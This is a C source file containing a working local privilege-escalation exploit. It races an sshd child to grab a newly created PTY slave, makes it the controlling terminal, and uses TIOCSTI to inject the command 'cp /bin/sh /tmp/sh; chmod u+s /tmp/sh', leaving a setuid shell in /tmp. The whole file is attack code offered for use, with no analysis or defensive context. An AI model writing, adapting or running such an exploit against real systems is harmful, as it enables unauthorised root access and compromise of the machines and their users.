#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
     
int main(int argc, char *argv[])
{
     char *cmd = "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\n";
     int pid, pts = -1;

     if(argc != 2) {
          fprintf(stderr, "Usage: %s /dev/pts/X\n", argv[0]);
	  fprintf(stderr, "Where X is next slave device to be created\n");
	  return 1;
     }
	
     if(!access(argv[1], F_OK)) {
          fprintf(stderr, "[-] %s device already exists\n", argv[1]);
          return 1;
     }

     pid = fork();

     if(pid < 0) {
	  fprintf(stderr, "[-] fork failed\n");
	  return 1;
     }
	
     if(pid == 0) {
          printf("[*] Waiting for slave device %s\n", argv[1]);
		
	  /* win the race by opening the PTY slave before sshd's child */
	  while(pts == -1)
	       pts = open(argv[1], O_WRONLY); 

	       printf("[+] Got PTY slave %s\n", argv[1]);
               printf("[+] Making PTY slave the controlling terminal\n");
		
	       dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);
	       setsid();
               ioctl(0, TIOCSCTTY, 1);

	       while(*cmd)
	            ioctl(0, TIOCSTI, cmd++);
     }

     else {
          wait(NULL);
	  printf("[+] SUID shell at /tmp/sh\n");
	  return 0;
     }
}